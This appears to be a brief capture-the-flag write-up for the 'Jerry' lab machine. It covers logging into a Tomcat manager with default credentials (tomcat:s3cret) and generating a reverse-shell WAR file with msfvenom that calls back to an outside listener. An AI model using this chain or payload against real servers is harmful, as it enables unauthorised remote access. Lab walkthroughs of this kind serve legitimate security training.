# Jerry

10.10.10.95

port 8080 is running apache tomcat 7.0.88

Dirbuster found `/manager` and we were able to login with `tomcat:s3cret`

Hunterbot told me about war files.

We generate a war file

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f war -o shell.war
```

then upload it

when we visit `/shell` we get a connection on our listener

Then we found the flags were both in one file:

![[Pasted image 20220715212426.png]]

